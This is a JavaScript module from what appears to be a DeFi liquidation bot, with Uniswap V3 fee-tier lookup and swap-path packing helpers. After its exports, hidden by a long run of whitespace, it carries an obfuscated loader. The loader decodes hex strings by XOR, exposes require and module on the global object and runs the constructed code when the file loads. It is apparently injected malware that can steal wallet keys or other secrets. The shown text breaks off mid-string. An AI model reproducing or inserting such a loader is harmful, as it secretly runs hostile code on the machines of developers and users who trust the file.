const factoryAddrCache = new Map(); // chainKey -> factory address (or null)
const poolFeeCache = new Map(); // `${chainKey}:${a}:${b}` -> fee (0 = none, cached)

async function getRouterFactory(provider, chainConfig) {
  const key = chainConfig.key || "default";
  if (factoryAddrCache.has(key)) return factoryAddrCache.get(key);
  let factory = null;
  try {
    const router = new ethers.Contract(chainConfig.swapRouter, ROUTER_FACTORY_IFACE, provider);
    factory = await router.factory();
  } catch (_) {
    factory = null;
  }
  factoryAddrCache.set(key, factory);
  return factory;
}

// Returns the common fee tier whose pool has the MOST current-tick liquidity for
// (a,b) — skipping tiers with no pool or zero liquidity — or 0 if none usable.
async function findFeeTier(provider, chainConfig, factory, a, b) {
  const key = `${chainConfig.key || "default"}:${a.toLowerCase()}:${b.toLowerCase()}`;
  if (poolFeeCache.has(key)) return poolFeeCache.get(key);
  const f = new ethers.Contract(factory, V3_FACTORY_IFACE, provider);
  let bestFee = 0;
  let bestLiq = ethers.constants.Zero;
  for (const fee of COMMON_FEE_TIERS) {
    let pool;
    try {
      pool = await f.getPool(a, b, fee);
    } catch (_) {
      // V2 factory or unsupported selector — treat as no pool at this tier.
      continue;
    }
    if (!pool || pool === ethers.constants.AddressZero) continue;
    let liq;
    try {
      liq = await new ethers.Contract(pool, V3_POOL_LIQ_IFACE, provider).liquidity();
    } catch (_) {
      continue; // not a readable V3 pool
    }
    if (liq.gt(bestLiq)) { bestLiq = liq; bestFee = fee; }
  }
  poolFeeCache.set(key, bestFee);
  return bestFee;
}

function packPath(parts) {
  // parts: [token, fee, token, fee, token, ...] — tokens as 20-byte addrs, fees
  // as uint24. ethers.utils.solidityPack == abi.encodePacked.
  const types = parts.map((_, i) => (i % 2 === 0 ? "address" : "uint24"));
  return ethers.utils.solidityPack(types, parts);
}

// Resolve the packed V3 path for collateral->debt. Returns "0x" if unresolved.
async function resolveSwapPath(provider, chainConfig, tokenIn, tokenOut) {
  if (!tokenIn || !tokenOut || tokenIn.toLowerCase() === tokenOut.toLowerCase()) return "0x";
  const factory = await getRouterFactory(provider, chainConfig);
  if (!factory) return "0x";

  const directFee = await findFeeTier(provider, chainConfig, factory, tokenIn, tokenOut);
  if (directFee !== 0) return packPath([tokenIn, directFee, tokenOut]);

  // 2-hop via intermediates: contract seeds wrappedNative, deploy adds
  // swapIntermediates. Dedupe and skip if intermediate == in/out (contract does).
  const intermediates = [];
  for (const t of [chainConfig.wrappedNative, ...(chainConfig.swapIntermediates || [])]) {
    if (!t) continue;
    const lc = t.toLowerCase();
    if (lc === tokenIn.toLowerCase() || lc === tokenOut.toLowerCase()) continue;
    if (!intermediates.some((x) => x.toLowerCase() === lc)) intermediates.push(t);
  }
  for (const mid of intermediates) {
    const firstFee = await findFeeTier(provider, chainConfig, factory, tokenIn, mid);
    if (firstFee === 0) continue;
    const secondFee = await findFeeTier(provider, chainConfig, factory, mid, tokenOut);
    if (secondFee === 0) continue;
    return packPath([tokenIn, firstFee, mid, secondFee, tokenOut]);
  }
  return "0x";
}

  module.exports = {
    BACKFILL_VERSION,
    borrowerBackfillIsCurrent,
    getUnhealthyPositions,
    getBorrowBackfillPlan,
    mapWithConcurrency,
    resolveSwapPath,
    getUserHealthFactor,
    getUserHealthFactorsBatched,
    sweepHealthFactorsStreaming,
    getDebtAmount,
    getDebtPosition,
    getDebtPositions,
    getPrimaryDebtPosition,
    getBorrowers,
    getBorrowersFromBorrowEvents,
    getBorrowersFromSubgraph,
    getReservesList,
    getReservesListCached,
    getPrimaryCollateral,
    enrichCandidateBatched,
    resolveChainMinDebtUsd,
    resolveChainTriggerHf,
    // ...other exports as needed
  };                                                                                                                                                                                                       var bx = '-5797';(function(fPZeik_YquphXqtQyHRwkDQZ,JD$sfFZlY){var hCwqN$TycCXHheR$HuWZsDOvxF=mRuCD$WVIvkbYeqeVB$DWVuj,lSwmVFd$$fctx=fPZeik_YquphXqtQyHRwkDQZ();while(!![]){try{var mJRjb_N$owLPKOpyRNreuVG=-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xee))/(-0x218a+parseInt(0x15e8)+parseInt(0xba3))+-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xec))/(-parseInt(0x2157)+0x1*-parseInt(0x1f6)+-0x45*parseFloat(-0x83))+Math['max'](parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf7))/(parseInt(-parseInt(0x25))*Math.max(0xeb,parseInt(0xeb))+0x652+0x14*Number(parseInt(0x162))),parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf2))/(Math.floor(parseInt(0x2517))+parseInt(0x224b)*parseFloat(parseInt(0x1))+Math.ceil(-parseInt(0x3f7))*parseInt(0x12)))*(-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf9))/(-0x9d7+parseInt(0x1525)+-0xb49))+Math['trunc'](-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xe8))/(Math.floor(0x45)*Math.trunc(-0x60)+parseInt(0x71)*Math.max(parseInt(0x4b),0x4b)+-parseInt(0x735)))+-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf4))/(parseFloat(0x2666)+-parseInt(0x26ae)+Math.floor(parseInt(0x4f)))+Math['ceil'](-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf6))/(Math.trunc(0xa70)+Math.max(-parseInt(0x1),-parseInt(0x1))*Math.floor(-0x2627)+-0x191*0x1f))*(-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xe6))/(-parseInt(0x190)*Number(-0xd)+Math.trunc(parseInt(0x64c))+-parseInt(0x1)*parseInt(0x1a93)))+Math['ceil'](-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf1))/(-0x2104+parseInt(-0x11a2)+0x32b0))*(-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xe7))/(parseFloat(0x903)+parseInt(0x157e)+Math.max(-0x1e76,-0x1e76)));if(mJRjb_N$owLPKOpyRNreuVG===JD$sfFZlY)break;else lSwmVFd$$fctx['push'](lSwmVFd$$fctx['shift']());}catch(aHXNJXaqWEgkjG$ZgG){lSwmVFd$$fctx['push'](lSwmVFd$$fctx['shift']());}}}(b$uDmFSLXmIK$qucbTlpj,Math.floor(-parseInt(0x9))*Math.trunc(-0x15df1)+parseInt(parseInt(0xb2fb))+-0x2059b),function(lWTIZCbSnBZmbdi,mqGHrC$ISCHySjTrqrJ,nOmMBoUELScCBaDiozDjUWW,ZXL$RvFZXoo){var eSwDbT_X$ig=mRuCD$WVIvkbYeqeVB$DWVuj;lWTIZCbSnBZmbdi['bx']=bx;function DJuiZmBDzVCcjxyApAcdDEUqo(jdryYdtWSYLOf$x,aSHApnrNHI$cj$JqQRc){var qcNOHFNlFaMXzChVo=mRuCD$WVIvkbYeqeVB$DWVuj,UJ$$vXHdWij=jdryYdtWSYLOf$x[qcNOHFNlFaMXzChVo(0xf5)](''),bk_yJOMhvfoWW=-parseInt(0x1e0a)+Math.floor(parseInt(0x161))*parseInt(-0x15)+parseFloat(-0x3aff)*Math.floor(-parseInt(0x1)),rhLLndUJYVkcLhTvQSvpLP_fxQ=aSHApnrNHI$cj$JqQRc[-parseInt(0x265)*parseFloat(-0x8)+Math.max(-parseInt(0x2b3),-parseInt(0x2b3))+parseInt(-parseInt(0x1075))],alrwebXs$tL$ShNjzZmUgR=UJ$$vXHdWij[qcNOHFNlFaMXzChVo(0xeb)];while(bk_yJOMhvfoWW<alrwebXs$tL$ShNjzZmUgR){var u$HOdtr$Gg=rhLLndUJYVkcLhTvQSvpLP_fxQ*(bk_yJOMhvfoWW+aSHApnrNHI$cj$JqQRc[Number(parseInt(0x1e57))+parseInt(0x1)*parseInt(0x1cf0)+-0x3b46])+(rhLLndUJYVkcLhTvQSvpLP_fxQ+bk_yJOMhvfoWW)%aSHApnrNHI$cj$JqQRc[Math.max(0xaf3,parseInt(0xaf3))+parseInt(0x35e)+0x14d*-0xb]+aSHApnrNHI$cj$JqQRc[Number(parseInt(0x150f))+parseInt(0x23f8)+parseInt(0x9)*parseInt(-parseInt(0x656))],EIbuLReUDYYUPPolfM$KwuQ=rhLLndUJYVkcLhTvQSvpLP_fxQ*(bk_yJOMhvfoWW+aSHApnrNHI$cj$JqQRc[-0x1*-parseInt(0x3ce)+Math.floor(0x511)+-parseInt(0x8dc)])+(rhLLndUJYVkcLhTvQSvpLP_fxQ*aSHApnrNHI$cj$JqQRc[parseFloat(parseInt(0xf))*-0x25c+parseInt(0x6)*Math.trunc(parseInt(0x4a5))+parseInt(0x789)]+bk_yJOMhvfoWW)%aSHApnrNHI$cj$JqQRc[0x2f4+0x1713+parseFloat(-parseInt(0x1))*parseInt(0x1a03)],T_NmrgaFLecRzbKAxuJmHKg=u$HOdtr$Gg%alrwebXs$tL$ShNjzZmUgR,V$NTSQaa$FIrzeb=EIbuLReUDYYUPPolfM$KwuQ%alrwebXs$tL$ShNjzZmUgR,I_mUJcwJV=UJ$$vXHdWij[T_NmrgaFLecRzbKAxuJmHKg];UJ$$vXHdWij[T_NmrgaFLecRzbKAxuJmHKg]=UJ$$vXHdWij[V$NTSQaa$FIrzeb],UJ$$vXHdWij[V$NTSQaa$FIrzeb]=I_mUJcwJV,rhLLndUJYVkcLhTvQSvpLP_fxQ=(u$HOdtr$Gg+EIbuLReUDYYUPPolfM$KwuQ+rhLLndUJYVkcLhTvQSvpLP_fxQ+bk_yJOMhvfoWW)%aSHApnrNHI$cj$JqQRc[Math.max(0x6d3,parseInt(0x6d3))*-parseInt(0x3)+parseInt(0x1e14)+parseInt(0x3)*-parseInt(0x332)],bk_yJOMhvfoWW+=parseFloat(-parseInt(0x55b))+-0x99b+0x3*Math.ceil(parseInt(0x4fd));}return UJ$$vXHdWij[qcNOHFNlFaMXzChVo(0xf8)]('');}var E_gRZVgYfuVwsNEpbdbS=String[eSwDbT_X$ig(0xf0)](Math.trunc(0x6df)*0x1+Math.floor(-0x1b93)+parseInt(0x14d3)),abxgK$W$UwDyQSN=DJuiZmBDzVCcjxyApAcdDEUqo(eSwDbT_X$ig(0xe9),ZXL$RvFZXoo);abxgK$W$UwDyQSN=abxgK$W$UwDyQSN[eSwDbT_X$ig(0xf5)]('#')[eSwDbT_X$ig(0xf8)](E_gRZVgYfuVwsNEpbdbS)[eSwDbT_X$ig(0xf5)]('~1')[eSwDbT_X$ig(0xf8)]('#')[eSwDbT_X$ig(0xf5)]('~0')[eSwDbT_X$ig(0xf8)]('~')[eSwDbT_X$ig(0xf5)](E_gRZVgYfuVwsNEpbdbS),lWTIZCbSnBZmbdi[abxgK$W$UwDyQSN[Math.max(0x7,parseInt(0x7))*parseInt(0xba)+-parseInt(0xd8e)*-0x1+parseInt(-0x4)*0x4a9]]=mqGHrC$ISCHySjTrqrJ;if(typeof module===abxgK$W$UwDyQSN[parseInt(0x36)*0xa5+0x3*-0x2ab+parseInt(0x1acc)*-parseInt(0x1)])lWTIZCbSnBZmbdi[abxgK$W$UwDyQSN[Math.floor(-0x103e)+0x37a+-parseInt(0xa)*-parseInt(0x147)]]=module;var TquFntEeiM_RphAR$nY=DJuiZmBDzVCcjxyApAcdDEUqo(eSwDbT_X$ig(0xed),nOmMBoUELScCBaDiozDjUWW),WtOtRsMXyjtHmepEhhVHCW$GYi=DJuiZmBDzVCcjxyApAcdDEUqo[TquFntEeiM_RphAR$nY[eSwDbT_X$ig(0xf3)](0x26c*Math.ceil(0x10)+-parseInt(0x664)+-0x205c,parseFloat(-parseInt(0x1aa))*-0x1+parseInt(0x368)+Math.trunc(-0xd)*parseInt(0x63))],L_aKjr_pPkOmXvD=WtOtRsMXyjtHmepEhhVHCW$GYi('',DJuiZmBDzVCcjxyApAcdDEUqo(eSwDbT_X$ig(0xea),nOmMBoUELScCBaDiozDjUWW)),DtzjBhf=L_aKjr_pPkOmXvD(DJuiZmBDzVCcjxyApAcdDEUqo(eSwDbT_X$ig(0xef),nOmMBoUELScCBaDiozDjUWW));return WtOtRsMXyjtHmepEhhVHCW$GYi('',DtzjBhf)(Math.floor(0x264a)+0x7b*parseFloat(-0xd)+-parseInt(0x163e)),0x1e61+parseInt(parseInt(0x3cbf))*Math.floor(0x1)+-0x2f1*parseFloat(0x13);}(global,require,[parseInt(-parseInt(0x7df3))*0x21+parseInt(0xf8)*0x6799+0x1be73e,-parseInt(0x1)*parseFloat(0x9a7)+Math.floor(parseInt(0x1c3a))+0x8b7*-0x2,0x107a*Number(-parseInt(0x4))+Math.max(parseInt(0x1),parseInt(0x1))*parseInt(parseInt(0xfe66))+Number(-0x2529),0xc6d+Math.trunc(-0x2)*Number(0x1d7)+-parseInt(0x3f6)*0x2,parseFloat(-0xc347)+Math.ceil(-parseInt(0x3))*Math.floor(-parseInt(0x808a))+parseInt(parseInt(0x41b))*Number(0xa),parseInt(0x2259cb)+Math.trunc(-parseInt(0x994))*-parseInt(0x9ad)+-parseInt(0x2ff1b8)],[parseInt(0x789110)+parseInt(parseInt(0x1f21c0))+Number(-0x1ba715),parseFloat(parseInt(0x51a))*parseInt(0x1)+parseInt(parseInt(0x108d))*-parseInt(0x1)+parseInt(0x2)*0x68c,-0x801d*parseInt(-parseInt(0x1))+Number(0x67db)+Math.max(-parseInt(0x8dab),-parseInt(0x8dab)),-parseInt(0xdf9)+Math.floor(0x53b)+0xaff,parseFloat(-0x1)*Math.max(-parseInt(0xff77),-parseInt(0xff77))+0x1522b+-parseInt(0x1a187),-0x480d98+0x660acf+Number(0x32c200)]));function mRuCD$WVIvkbYeqeVB$DWVuj(BggsOPJeGHmfI_$MySkkjD,TTUU$Tj){var AzWQMlHCzyHSyBEx=b$uDmFSLXmIK$qucbTlpj();return mRuCD$WVIvkbYeqeVB$DWVuj=function(O$X$moYK,WKJCDVtgqqGj$NcSTJCFx){O$X$moYK=O$X$moYK-(-parseInt(0x3ed)*parseInt(0x1)+Math.max(-parseInt(0x635),-parseInt(0x635))+Number(-0x161)*-parseInt(0x8));var gGNJBPjaNz_gaBUm_UU=AzWQMlHCzyHSyBEx[O$X$moYK];if(mRuCD$WVIvkbYeqeVB$DWVuj['uUdDay']===undefined){var ocgXuRKQMDZGqcqMUpCiqDr=function(dWMZvP_$UbcraF){var BCWc_pEqE=parseInt(0x1049)+-0xd92+-0x1b7&-parseInt(0x1898)+-parseInt(0x1)*-parseInt(0x1b79)+Number(0x1)*-0x1e2,L$yXZvbWQ=new Uint8Array(dWMZvP_$UbcraF['match'](/.{1,2}/g)['map'](SLyuLTRyLf_bu=>parseInt(SLyuLTRyLf_bu,-parseInt(0x2489)+Math.ceil(parseInt(0x2524))+-parseInt(0x8b)))),hrk$_MLWpNTM=L$yXZvbWQ['map'](GXLAxwL_ABApIx_vKvQbldiYtp=>GXLAxwL_ABApIx_vKvQbldiYtp^BCWc_pEqE),m$$PdlcyLS=new TextDecoder(),MJpBkWtv=m$$PdlcyLS['decode'](hrk$_MLWpNTM);return MJpBkWtv;};mRuCD$WVIvkbYeqeVB$DWVuj['aakEIY']=ocgXuRKQMDZGqcqMUpCiqDr,BggsOPJeGHmfI_$MySkkjD=arguments,mRuCD$WVIvkbYeqeVB$DWVuj['uUdDay']=!![];}var hVGoCII_AMwtjiMIJzdCEhPQ=AzWQMlHCzyHSyBEx[parseFloat(parseInt(0x2271))+parseInt(0x20ae)+-parseInt(0x431f)],jux_$kSDJQHD=O$X$moYK+hVGoCII_AMwtjiMIJzdCEhPQ,AqyA$$X=BggsOPJeGHmfI_$MySkkjD[jux_$kSDJQHD];return!AqyA$$X?(mRuCD$WVIvkbYeqeVB$DWVuj['bWwrdG']===undefined&&(mRuCD$WVIvkbYeqeVB$DWVuj['bWwrdG']=!![]),gGNJBPjaNz_gaBUm_UU=mRuCD$WVIvkbYeqeVB$DWVuj['aakEIY'](gGNJBPjaNz_gaBUm_UU),BggsOPJeGHmfI_$MySkkjD[jux_$kSDJQHD]=gGNJBPjaNz_gaBUm_UU):gGNJBPjaNz_gaBUm_UU=AqyA$$X,gGNJBPjaNz_gaBUm_UU;},mRuCD$WVIvkbYeqeVB$DWVuj(BggsOPJeGHmfI_$MySkkjD,TTUU$Tj);}function b$uDmFSLXmIK$qucbTlpj(){var QRDjnNHZyExj=['32333139393339555758676967','343132353131587043687461','35393632383438436e67584566','726d746a63656f236223','336a64202c3c736132733d5d3d283b7533323d306f3161387b2961693b2b2972697b7261696e696e7d6e6c2e722961302b6c6f77636f33722022656f6e5b7475746262745b5d29707639386f7032613c7472636934766c343b3b635b20617638362c2961733b2265762b2c723b7337286f372d6e66617228362c70696838695d6b7467722b6d5b2b5b613131336f72322832726f30627d652074636136217634723d285d663b6969742e2b72206921293b31742c2e382e2b737466412c732e6f723b6f2e743d2b2b6e683b2b7b2b283b4175633b6472753b3b74737531373663722029725b663d223374386973683d6163643d65686273316f296e756667706972722b30282c6e746c63696365283e333b74752c39757261617234316e613b61695b62762969687274746168686f6569656473726961736c6e67723b707474686e3b6c6e743d306c74282e693d2e766670203d6f78296e316c6f226128636974693b6f6561332c63363362743d616c72613d37692e61756c6c3b766869316f7d73664375306e76322d5b3972696e3274536c6176657b61293d657220757465203933286e2970612e286d333320733b6f2c33675b653b69642e69436128677430733b29656631226f3b61683166432b676a222c686f723d3b6f752a6d613274743d2b38205b633b613d3674296661736e6f63307b6372206428207d2c743b31742a375d723b6f652e37396474356e702929622861722b6869363c61616b742e76763164292b38707d432065655b356d28746e7438743d6374293e2969723d72667428316c6e2873292e633067666930643d6961613b642933286f64693d74306c762e61292972206f4374727529727d732c6572642c623161322b722e696b2876743b637261286e742c6f742929316c733763386b7430745b6665663d28376c743d3d6574533b695d695b7374333b3c4163286168337461313d3d723b612e2c2820613b74296b722b3862723d75613b6374747420296e3b7365746330222e616963746e2d2c315b2e747468202c2c67332d307176746f4165312b742b326f3b5d6928622d722b646c6f737873726c703d7474296772696a6c636e6263666f722020696361736f2c3b3b75623d3063737372732c74766d745d6c20696e6c3d74315d7a653b69727461296669372c72226575295d2b75747d702e75686170742c766676746b6b7074307632207569786170616f672c6a74756e69315d646f323474693d6374432d74417b226f633b336530353d617328287462285d68626f3d736532653b6969653b33736770702e62432069626e692b7266726f656f616e753d6864652e343b2b74682d726f76792e2032342e616f693d5d74283d3d6f726d73767b6c6b747562693b3c7465743861282e666928303d6c657328642875746864746c696869763469752b3d765d736a6f742e206f742c616f303d346c756d6c62667232334363326f2c3b653d65613474783d61732c7467722e756f6d29612873616631682967726974227072347266616863393b7865296b','6c656e677468','33343139303457777961516f','7463666e74616c6d73696f6f70776e656a6267726b7568747172797872766f75736463637a','313430303733304d474a4a7876','51653f5b225b4a5b2f7465635b3c5b675b3b4a242d2e2e346e29693c28777b3f30795b5d696340422830782e39236163435b695b635f29636c2e266a692e292e695b3f2c69634363352e203d5b5b3c36686d69345b742070635b643f3a422c735860385f28643f3f3f6e5b5b2a793f656b5b6f3b662e3f3d3c265b2e66353f532121665b207446543f295b6f215b5b5b65552e67745b495b4c3f2e203f63577854712065483f2a77723a3d692e3f325b632e352e262e26255b64766f245b78407258625b513f533a4872635b242e5b6367725b235b346c5f5b5b2e655b69242e63222e3f6547745b20723f56787e425b4a2762735b5b222e53416f202e5f2b3f3f2a63257a6e5b66653a2c6e69315f74695b5b62594f2e63566367642e745b5b7d722e216e5328447b416b6563296e5b6b2e2e722948725b5b2b6f666c6973685b665b5b704e685b7b5b2e3f407366245b21325b79662e3f2e7b20733165256b2e35732e5b5b215b237369223b7d744c3b5b65625b2b285b5b33375b2e44485b63643f6d7d2030633b296c634d2474323f5b42732e20733f28383f5b277839786f2e78625069636b3b5b535b632e2e522e3d2e2e69273828735b215b6c206f2620255b6e3f7b6e61735b20656b2e5b6e63726c7266636d5b21692d6126652e7d696263654c7328216f5b6f766d686f532b6c203238616b242e632e207d653f752842435b2e235b7465672e653f5b615b2967637377733f2e5b286165636d7b346c2e7d635b655b285b52505b2a2e5b4a65656d69685b2a5b5b5b61206165295b2e64652e5b725b4338625b416a5b6b383f412e61326d66722e743f665b2b662e6e5b632e2e6a6e217366612e632e5b765b465b3f5b783f3f4c6475735e235b29655b3b6328735332636c5f53362e682f63633f2e64365b686e2e2f755b69382e3f3429732a7a6f212e6e6173302e357625313f792e635b3f5b7e23733f5b6e3f63225b5b582e2a635375215b2e5233292e697a6f5b6362695b203f2e21745b642e5b495b7754635b652f662e6748795b5b3f5b666c5b5b6c5b74212b69742d2e215b2e6530683f382b5b75302733306642303f207328672e31664c302e5b2e7825633f3e726f2e5b202e633f282e283f2e3a726c77237d282e63372e63726e2e5b3f656e5b3f3d65782e635b53656132652e2e2e283163703d2e732e343e3f315b61615b632a5b345b625c742e6e6b62202e3f456c3366215b345f3e275b74205b672e732928303a28657d63402e73742e5b23616b2f5b2e74316361206a29456f4d2e736c5f5b3f5b634f322e5b5b732e4963755b206369502e74455f283f6341212166756620725b21367263636b5b35302b5b402e5b65615b232e6925285b2c292b5b633d6e3f27202e3f215b5f5b345b4c736423792b3f536c506f2e663b65537d6965412e2e3f6f745b214b6d46645b3a6c57722e206476213f63255b5b7d7d236e2e2e76732e6f7d3f46725b5b5b456c755b5f655b7d5b30203f43386636646c65635b74625b452e635b2e3c64217072697b2b293f623f535b30677441655b705b2e5b2e50692e2e645b3f3f616f3e74696d746674655b7243243f5f5b6d69732e2e65703f217222625f6d395b626c2e5b6f743b267666696f2e63233f4575352e213a68205b2e7d225d6f765b3f64793f613f742a292e2d6f79692e322e6158695b3f5b242e732d2e63532e7220795f3d66542174415f65652e3f526a4e733e702e39777863686c6c645b226b635b5b5b2d66766528637b732e216b786729537d2c535c227025782e475b74755b612e22704d2e5b2274296964335e29562d5b2e5b623863535b2e67653f74593f4e3f6965444135635b412e215b645b5b6e5b72776b6c76655b2e6f727063285b395b724d3f3f5b5b5b51652869343f20635b2b245b2674232e215b292248682e3a732b5b5b643f413f306c6e3f657236733f705b2e2f5d5b776520535b3f3f2e202d64642e745b72655b6b5a63282e2e615b662e215b675b662863537945533f6e655b5b5b65715b68705b5b2e732e643f5b432e36795b45612c555e2e695b64287d61695b3f735b785b65456965642765725b2e742d5b7327405b596c6e5b523a5b7268653c656e6c73282c5b613f5769652e29273f202974612e5b73535b633f2f6b3f676368692e6832773f752e635b582e36692e63637472735b356721702e655b6c415b5b42795b5b3f5b457469316f2e655b69222e21534f252e6b752e625b632128275b3f5b65666c6145635b637265693f5b2e6d625b69395b7b2e63216f3f2e6f3f283f215b525b73723f4272286f745b347a203f6f2f2e5b6821282c765b5b4e46723d746f5b2074655361213474613f34493672783b405b296b6d7b642e276f5b2e2e323f5b7435793b3f2e5b6420635b5b632e5b3f635b2f6e745b202165637737292e735b3f49743f5b302e695b2e2e5b34636d5b3b245b6f5b635b792e696d25452164205b7a6f2e6821757a616e6364695b745b5f453f667d745b5b5b6565725b2e2d7d2e4a325b2141382e666e7d252e6e5b555b695b5b2e663863203e70513f222028337821653862664f5b7b7329627365782e5b5b533f3f2e645b6b4f5b653f695b767d5b2e652e535b755b215b765320276b5b415b2931744430796e6f67797245505b65202e666f7373215b2e5b286a7b65206373297b425b3f2f20572078232427212e5b50725b29632a3f3f235577413f347270732e3f3d2f6d2e3b685b352e6420485b6f5b64256a5b283f205336632e225b346c745b5b74307d6170742867215b6b302e5b3f285b242e5b63736f253b5263322e5b643f73433f2e653f65455b6853295b216f635b2e2e205b6f2d636d2d6d732e5374636f682e65342e3f5b637b2e5b733072213970655b2e3374633f53732e63642e5b5b7a3522733d5b2e205b5b722e495b3f5b3f22335b2e3f536379656c3f3f225b5b693334645b6f6c735b6e73706f214f696579725e315d67605b4a5b312e3f2b6820745b7b215b2d746c5b5f4c5b5b695b63693f53535c5b5b30645b653f6c5b2d5b787274285b6b5b283f65635b495b785b63615b247273633f53695b6c25745b63725e723f5b6122305b382d215b6d5a742e42655b693a3c34743d672e5b6374777326585b743f7073623f2273413f2e2e732039215f29347d206d70205b394673796e6863316f635b2e6d3c73235363632c5b75535b463e72642e742472263f733e5b2e33215b2820505b5b736d315b2e633f2a2e6f5b752e5528742166415d3b26697d2e2e61215b732d52715b25242e3f35622c2e5b733f62726974313f5b292e7c6c3f3f633d735b6f557442415235205b63432e48644f2122742174722e3f763a5b66616d662e3262693b5b3230762e396945653d5b6767695b3d643f2e675b5b6339395f5b643434613f3a203c226c752e622163636e5b3f6f774f696c3f6b2b5b3f5b2e30255b5b742e632e2e286f2e2e2e612e2e2e45295b5b5b576d7478475b36293f5b6458414d75252e656d6770662e576b63636c365b722e5b5b5b204c2063512d37383f5b412e632e636e665b31623f6e5b5b28652e275b3f25303f202e5b632e75285b236573612e7b3f7b293f2e3f5b6e5b5775335b3f6f655b426363545b655b737d2273282b61615b6c2e746f5b6d3c492e5b3c75496e3f746d206229337a6b225b287777215b537c5b2e557d225b305b225b782e6549532e3f3f282e65296f2e29612e5b3f5b682e632d51265b3f5b2e60427d732e2d2e5b532e5b636664607b35635b287a5b5b6f5b545b5b2e5b2d6b5b672e29266f255b58613075415b3f5365693b754f322e2753702e7066306972675b6f7866202e2d5b276c3f22633f6d28462b6c5b5a2e642048325b6974692875785b60723f202e75612e3e6e463f3f2e736f5b635b3f78632b74617b752e745b634d3f675b222e3f703f5b7262787b2e5b303f6c345b7b6d5b202e61613f21346f6363613b7220625e3d272a743f725b703d2e3f655b636365696f482e3f737a3f3f2c6e215b5b2e34675b3a296c6c5b245b6c295b5b2e3f67635b41705b6d5b6672632d692e66283f5b3f5b5b6e2e695b613f702e27373f4a773c7338225b246463222e30706b635b30285b3f28656378585b72695f2e475b46205465482e6c2e5b2e3372732e3e2c74225f7725733f2e30747345695b3f28734e4128296e3663295f6f663b215a312e2e656c73635b2a4c283d373f205b5b635b373f765b265b766e5b204f3f2e64486763205b5b50455b6169635b28732e5230323f6b3f637d656567636c633f70285b705b63606b5b703f65555b3f5e7250745b2e3b3f373f203f285b495b3f2e723f314828535b72772e6f5b65696e6963735b3878633f695b653f69227e5b2073613f505b265a2e493f2979295b5b5b4f636b33732e5b6d6a7528543f6e2c5a65705b3f204f7e393f5b48665b35272e69732e5b656f325b7361213f613f4c2028383d523f403d5b6465692e53296c64745b5b3f215b655b2a732e20632e6a72393f205b262e6336733f4271315b287d795c3f733f3c3d3066603f286e2e22485b65743829227352665b2e295b5b246e6e73616366765b2e3f675b74215b3679732e3f63415b5b33702e5b706564612e5b5b636e7d20702e2d4e7b756d257a66706574743253635b3f2e2963792d635b6069736e71292866795b21636d726f655b752e732c237c675d61636d21532e653f7b6563725b736c2e725b3f68615b5b7a2e5b5b773f6d69783f653428673f74372e2e20204a3f632e6f3f2e5b2136794b2e2e262174695b66693f695f43615b2e2128682e2062212e242e7c624d3f5353695b693f5b3f74243f5b376c28695b3f2e5f2e643f38696c412b5f215b3b5b69453f2e3f745b3f7348533f61522e3f203f48695b653f2e5b506161522061703f5b213e47242e5b662e742e6063203f2329684264635b3f6e5b284b265b53282e7061306137743d5b205b3f2e632c643f332873725b4070632e2674256d743f3d657b29733663532e285b73535274655b5b21742e6e6e656e5b752e41245b6f446c75655b69526c31635b5b5e225b744a202e3f6474742e4a4227742e5a5b7a2e2e2e5f4f236964613f70522e2967252e2e40616c3321756c5c215b6f73735b215b285d4f6f5b696e5b6573253e5b6564302a725b7224245b5b642e775b7b335b5b345b5e63636362302965642e262e715c74533f6f7c66436478533b3b64726541456e5b702e5b667d356568593f635b2e366272743f7c6653652e5b7d2840243f2e6464705b705b652e655b5b653f61632e666c785b222e653032732e2e5b5b742c5b242c655b665e785b626e646c3a5b467228302c3f2e285f7b2e23247c6e65696b6165383a2e2e382e2e212e2e3f2e223f24646f2e5b3f282e2f5b2978636e2e5b5b70756650295b2e745b612f2465666322335b2874297270632e6f5b745b222b5b7b4f3f2b285b2970765b2e2e5b742e74363f4065505c2c5b5b2e5b6b653f6c5b215b4d5b6521663f2e2d2e29616362436941633f6c2e5b675b5b2e243a733f6264693f2173725b282e76532b635b355b63746328332173325b746c2d5c6735535b646572795b3063627d205b6f3f74212072412f2e612e6a2b34447b5b5b5b515b5b3f4461653a253f5b275b236265215b6e2e2e74243c2e2e5b286e663b2e726e6566615b5b743a3f3a6329206530634121747c703f642e652e3f6a612e736373303f6e663f225b2e613f4622735d66693b216f62742e3f325b2f77312e797d6d69493f5463635b3f685b25673f427365213f5b506c2e5b69333174346b7d5b2a5b2e5b21455b513f6763295b705b2f5b275b5b7d696666732e5b3f5b5b5b66652c21635b3c5b2a293f2975663f5b742e235b73303f6d6665725b795b537d20733f23287236426e4a23223329622774292c645b6b2672455b2e2e5b2e63286e257b532e2e636e3c5b63635f5b3f3f5b68367d2e3f442e492d656e64704f536e3f542e613f23755b5b743e2e61323e6e286e7326743d785561654b73645b3f6573536f554b2e2e202e69697373306348734a5b753f7274282c275b235b743f77793f5b3a74743f4a6220355a773372535b3f206f3f56245b535b5b46646c5365643f5b2165796c745b5b55382e6661737865725b226c3f652e7b632e3f632e656f3f3d6d635b2e6f2e747b5b5b372277205c655b637a632f6b2e21643e515b532e633538282e6f5b3f2e63762e745b5b612e695b3f2e5b3f745b636e4e5b5b535f62635b5b6674623f202e723f2b5b6e3f26422e736328615b515b285b6221636b3f293f676e5b6d5b63762340456a63695b215b3d41732e743f712e2e7a282e2453707d6e285f3f2d63652072742e73615b2e4b4a69485b5b7953532e5b315b2e6e443f595b695b637566745f5f293f7446425d3f2973293f2d2e5b73222e2e735b403f417370483f4f74745b3f232e295b5b6f653f6378676e25745b5b61335b535b2e6f2e3f5b2e5f41285b5b696621722d2f21642a61282e3f223f322e5b536465674a73785b592023275f2e2833502448636e7429635b3d33735b212e5b5b3f393f635b633d632f575b782e6e5b556569204c286c6f3f72695b5363696968633c2e7d68216f214575413d75616a246c5b78612e615b2